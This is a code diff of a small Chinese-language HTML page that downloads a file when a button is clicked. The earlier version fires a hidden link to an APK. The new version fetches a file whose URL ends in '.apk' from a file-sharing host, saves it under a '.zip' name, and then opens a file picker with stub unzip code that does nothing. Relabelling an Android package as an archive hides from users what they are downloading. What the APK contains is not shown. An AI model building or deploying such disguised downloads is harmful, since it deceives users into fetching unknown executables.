@@ -3,20 +3,49 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Download Button</title>
+<title>Download and Unzip Example</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.5.0/jszip.min.js"></script>
 </head>
 <body>
 
-<!-- 隐藏的下载链接 -->
-<a href="https://dxkuw5pviiy2n.cloudfront.net/1866363851386957826.apk" id="downloadLink" style="display:none;">Download</a>
-
-<!-- 可见的下载按钮 -->
-<button onclick="downloadFile()">下载文件</button>
+<button id="downloadBtn">下载压缩包</button>
+<input type="file" id="fileInput" style="display: none;" accept=".zip">
 
 <script>
-function downloadFile() {
-    // 触发隐藏链接的点击事件
-    document.getElementById('downloadLink').click();
+document.getElementById('downloadBtn').addEventListener('click', function() {
+    var fileUrl = 'https://pan.ly93.cc/f/KNGNUZ/loii.zip_sign.apk';
+    var link = document.createElement('a');
+    link.href = fileUrl;
+    link.download = 'loii.zip_sign.zip';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    
+    // 监听文件选择事件
+    document.getElementById('fileInput').addEventListener('change', handleFileSelect, false);
+    
+    // 触发文件选择
+    document.getElementById('fileInput').click();
+});
+
+function handleFileSelect(event) {
+    var file = event.target.files[0]; // 获取选择的文件
+    if (file) {
+        var reader = new FileReader();
+        reader.onload = function(e) {
+            var data = e.target.result;
+            JSZip.loadAsync(data).then(function(zip) {
+                // 这里你可以遍历zip文件并解压内容
+                zip.forEach(function(relativePath, zipEntry) {
+                    zipEntry.async('blob').then(function(blob) {
+                        // 这里你可以使用FileSaver.js来保存文件
+                        // saveAs(blob, relativePath);
+                    });
+                });
+            });
+        };
+        reader.readAsArrayBuffer(file);
+    }
 }
 </script>
 
